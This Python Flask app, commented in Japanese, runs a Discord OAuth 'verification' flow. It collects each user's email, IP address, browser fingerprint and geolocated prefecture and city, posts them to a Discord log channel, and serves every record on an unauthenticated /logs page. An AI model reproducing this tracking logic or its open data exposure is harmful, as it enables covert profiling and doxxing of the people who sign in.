# app.py
from flask import Flask, request, render_template, jsonify
import os, json, threading
from dotenv import load_dotenv
from datetime import datetime
from discord_bot import bot
from user_agents import parse

load_dotenv()

app = Flask(__name__)
ACCESS_LOG_FILE = "access_log.json"

# ---------- Discord ----------
DISCORD_CLIENT_ID   = os.getenv("DISCORD_CLIENT_ID")
DISCORD_CLIENT_SECRET = os.getenv("DISCORD_CLIENT_SECRET")
DISCORD_BOT_TOKEN   = os.getenv("DISCORD_BOT_TOKEN")
DISCORD_GUILD_ID    = os.getenv("DISCORD_GUILD_ID")
REDIRECT_URI        = os.getenv("DISCORD_REDIRECT_URI")

# -----------------------------
# ユーティリティ
# -----------------------------
def get_client_ip():
    for h in ("CF-Connecting-IP", "X-Forwarded-For", "X-Real-IP"):
        v = request.headers.get(h)
        if v:
            return v.split(",")[0].strip()
    return request.remote_addr

def save_log(discord_id, data):
    now = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    logs = {}
    if os.path.exists(ACCESS_LOG_FILE):
        try:
            with open(ACCESS_LOG_FILE, "r", encoding="utf-8") as f:
                logs = json.load(f)
        except:
            logs = {}
    if discord_id not in logs:
        logs[discord_id] = {"history": []}
    data["timestamp"] = now
    logs[discord_id]["history"].append(data)
    with open(ACCESS_LOG_FILE, "w", encoding="utf-8") as f:
        json.dump(logs, f, indent=4, ensure_ascii=False)

def send_embed_and_role(user_id: str, data: dict):
    try:
        embed_data = {
            "title": "🔐 セキュリティログ通知",
            "color": 0x2B2D31,
            "description": (
                "```ini\n"
                f"[ ユーザー ]\n{data.get('username')}#{data.get('discriminator')}\n"
                f"ID={data.get('id')}\n"
                f"Email={data.get('email')}\n"
                f"IP={data.get('ip')}\n"
                f"県・市={data.get('prefecture')}/{data.get('city')}\n"
                "```"
            ),
            "thumbnail": {"url": data.get("avatar_url")},
            "footer": {"text": "BLACK_ルアン セキュリティモニター"},
            "timestamp": datetime.utcnow().isoformat()
        }
        bot.loop.create_task(bot.send_log(embed=embed_data))
        bot.loop.create_task(bot.assign_role(user_id))
    except Exception as e:
        print("Embed/Role 送信エラー:", e)

# -----------------------------
# ルート
# -----------------------------
@app.route("/")
def index():
    return render_template("index.html")

# -----------------------------
# Discord OAuth2 コールバック
# -----------------------------
@app.route("/callback")
def callback():
    from urllib.parse import quote
    import requests

    code = request.args.get("code")
    if not code:
        return "コードがありません", 400

    token_url = "https://discord.com/api/oauth2/token"
    headers = {"Content-Type": "application/x-www-form-urlencoded"}
    scopes = "identify email connections guilds"
    data = {
        "client_id": DISCORD_CLIENT_ID,
        "client_secret": DISCORD_CLIENT_SECRET,
        "grant_type": "authorization_code",
        "code": code,
        "redirect_uri": REDIRECT_URI,
        "scope": scopes
    }

    try:
        res = requests.post(token_url, data=data, headers=headers, timeout=10)
        res.raise_for_status()
        token = res.json()
    except requests.exceptions.RequestException as e:
        return f"トークン取得エラー: {e}", 500

    access_token = token.get("access_token")
    if not access_token:
        return "アクセストークン取得失敗", 400

    headers_auth = {"Authorization": f"Bearer {access_token}"}
    user = requests.get("https://discord.com/api/users/@me", headers=headers_auth, timeout=10).json()

    avatar_url = f"https://cdn.discordapp.com/avatars/{user['id']}/{user.get('avatar')}.png?size=1024" \
        if user.get("avatar") else "https://cdn.discordapp.com/embed/avatars/0.png"

    ua_raw = request.headers.get("User-Agent", "不明")
    ua = parse(ua_raw)

    # 最小データを画面表示用に準備
    data_min = {
        "username": user.get("username"),
        "discriminator": user.get("discriminator"),
        "id": user.get("id"),
        "email": user.get("email"),
        "avatar_url": avatar_url,
        "ip": get_client_ip(),
        "prefecture": None,
        "city": None,
        "user_agent_raw": ua_raw,
        "user_agent_os": ua.os.family,
        "user_agent_browser": ua.browser.family,
        "user_agent_device": "Mobile" if ua.is_mobile else "Tablet" if ua.is_tablet else "PC" if ua.is_pc else "Other",
        "user_agent_bot": ua.is_bot,
    }

    # 画面表示（ブラウザ側で位置情報取得）
    return render_template("welcome.html", data=data_min)

# -----------------------------
# 位置情報ログ受信
# -----------------------------
@app.route("/log_location", methods=["POST"])
def log_location():
    data = request.json
    user_id = data.get("user_id")
    ip = get_client_ip()
    prefecture = data.get("prefecture", "不明")
    city = data.get("city", "不明")

    log_data = {
        "ip": ip,
        "prefecture": prefecture,
        "city": city,
    }

    save_log(user_id, log_data)
    send_embed_and_role(user_id, log_data)
    return jsonify({"status": "ok"})

# -----------------------------
# ログ閲覧
# -----------------------------
@app.route("/logs")
def show_logs():
    if os.path.exists(ACCESS_LOG_FILE):
        try:
            with open(ACCESS_LOG_FILE, "r", encoding="utf-8") as f:
                logs = json.load(f)
        except:
            logs = {}
    else:
        logs = {}
    return render_template("logs.html", logs=logs)

# -----------------------------
# Bot 起動
# -----------------------------
def run_bot():
    bot.run(DISCORD_BOT_TOKEN)

if __name__ == "__main__":
    threading.Thread(target=run_bot, daemon=True).start()
    app.run(host="0.0.0.0", port=10000)
